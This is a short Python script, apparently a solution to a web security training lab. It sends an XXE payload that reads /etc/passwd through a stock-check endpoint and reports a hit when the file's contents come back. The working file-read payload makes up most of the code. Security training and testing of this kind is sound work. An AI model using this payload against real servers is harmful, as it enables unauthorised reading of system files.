import requests

def scan_xxe(base_url):
    """
    Checks for XXE vulnerabilities on the given base URL.
    
    Args:
        base_url (str): The base URL to test for XXE vulnerabilities.
    
    Returns:
        tuple: A tuple containing a boolean indicating if vulnerabilities were found and a description.
    """
    # Construct the full URL for the stock check endpoint
    stock_check_url = base_url.rstrip('/') + '/product/stock'

    # XXE payload to test for vulnerability
    xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <stockCheck>
        <productId>&xxe;</productId>
        <storeId>1</storeId>
    </stockCheck>
    """

    # Set the headers to indicate that the content is XML
    headers = {
        "Content-Type": "application/xml"
    }

    try:
        # Send the POST request with the XXE payload
        response = requests.post(stock_check_url, data=xxe_payload, headers=headers)

        # Check if the response contains the contents of /etc/passwd
        if "/bin/bash" in response.text or "root:x:" in response.text:
            description = "The application is vulnerable to XXE.\nUsed payload:\n" + xxe_payload
            return True, description
        else:
            description = "The application is not vulnerable to XXE or the payload did not succeed."
            return False, description

    except Exception as e:
        description = f"An error occurred: {e}"
        return False, description

if __name__ == "__main__":
    target_url = "https://0a7300d804ff46b180b10d2b002a0083.web-security-academy.net/"
    vulnerabilities_found, description = scan_xxe(target_url)
    print(description)
